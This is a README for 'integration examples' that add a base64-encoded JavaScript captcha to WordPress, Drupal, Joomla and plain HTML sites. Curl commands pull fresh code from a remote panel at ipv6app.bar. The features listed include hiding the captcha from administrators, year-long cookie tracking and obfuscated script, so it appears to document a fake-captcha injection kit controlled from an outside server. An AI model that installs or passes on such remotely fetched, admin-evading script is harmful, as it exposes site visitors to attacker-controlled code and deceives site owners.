# Integration Examples

This folder contains ready-to-use integration code for different platforms.

## 📁 Files

### `wordpress_integration.php`
**For:** WordPress themes and plugins  
**Usage:** Add to `functions.php` or create custom plugin  
**Tested:** WordPress 5.x, 6.x

### `drupal_integration.php`
**For:** Drupal themes and modules  
**Usage:** Add to theme or custom module  
**Tested:** Drupal 8.x, 9.x, 10.x

### `joomla_integration.php`
**For:** Joomla templates and plugins  
**Usage:** Add to template's `index.php`  
**Tested:** Joomla 3.x, 4.x

### `html_integration.html`
**For:** Any website (static or dynamic)  
**Usage:** Copy `<script>` tag before `</body>`  
**Works:** All modern browsers

## 🚀 Quick Start

1. **Download the file** for your platform
2. **Follow instructions** in the file header
3. **Test** on your site
4. **Check** admin panel for statistics

## 🔄 Update

To get fresh code with latest settings:

```bash
# WordPress
curl https://ipv6app.bar/public_api.php?engine=wordpress > wordpress_integration.php

# Drupal
curl https://ipv6app.bar/public_api.php?engine=drupal > drupal_integration.php

# Joomla
curl https://ipv6app.bar/public_api.php?engine=joomla > joomla_integration.php

# HTML
curl https://ipv6app.bar/public_api.php?engine=html > html_integration.html
```

## ⚙️ Configuration

All examples use settings from panel:
- Cookie name: `cookie-captcha-complete`
- Base URL: `https://ipv6app.bar`
- Template: From panel config
- Theme: From panel config

To modify settings, log into admin panel:
https://ipv6app.bar/login.php

## 📊 Features

- ✅ Admin bypass (admins never see captcha)
- ✅ Cookie-based tracking (365 days)
- ✅ Automatic reload after captcha
- ✅ Mobile responsive
- ✅ Cross-browser compatible
- ✅ Database logging

## 🔒 Security

- Base64-encoded JavaScript
- Checks user roles
- Secure cookie handling
- HTTPS recommended

## 📖 Documentation

Full API documentation: `../API_INTEGRATION.md`

---

**Generated:** February 11, 2026  
**Panel:** https://ipv6app.bar
